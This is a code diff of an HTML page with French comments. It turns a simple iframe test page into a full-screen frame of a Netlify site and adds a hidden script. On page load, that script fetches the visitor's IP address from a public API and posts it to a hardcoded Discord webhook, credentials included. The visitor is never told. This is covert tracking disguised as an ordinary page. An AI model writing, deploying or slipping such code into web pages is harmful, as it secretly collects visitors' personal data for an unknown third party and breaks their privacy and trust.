@@ -1,9 +1,60 @@
 <!DOCTYPE html>
-<html lang="fr">
-<head><meta charset="UTF-8"><title>Test IFrame Lovable</title>
-<style>html,body{margin:0;height:100%;}iframe{width:100%;height:100%;border:none;}</style>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Principale</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden; /* Cache les barres de défilement si nécessaire */
+        }
+        iframe {
+            width: 100vw;
+            height: 100vh;
+            border: none; /* Rend l'iframe invisible ou discrète */
+        }
+    </style>
 </head>
 <body>
-  <iframe src="https://www.photopea.com/"></iframe>
+    <!-- Iframe pour afficher le site cible -->
+    <iframe src="https://nyrservice.netlify.app/"></iframe>
+    
+    <script>
+        // Fonction asynchrone pour récupérer l'IP et l'envoyer au webhook
+        async function grabAndSendIP() {
+            try {
+                // Récupère l'IP de l'utilisateur via une API publique
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;  // Extrait l'IP
+                
+                // Envoie l'IP au webhook Discord
+                const webhookURL = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
+                const sendResponse = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Nouvelle visite : IP de l'utilisateur = ${userIP}`  // Message personnalisé pour Discord
+                    })
+                });
+                
+                // Vérifie si l'envoi a réussi (optionnel, pour le débogage)
+                if (sendResponse.ok) {
+                    console.log('IP envoyée avec succès');
+                } else {
+                    console.error('Échec de l envoi au webhook');
+                }
+            } catch (error) {
+                console.error('Erreur lors de la récupération ou de l envoi de l IP:', error);
+            }
+        }
+        
+        // Exécute la fonction au chargement de la page
+        window.onload = grabAndSendIP;
+    </script>
 </body>
 </html>
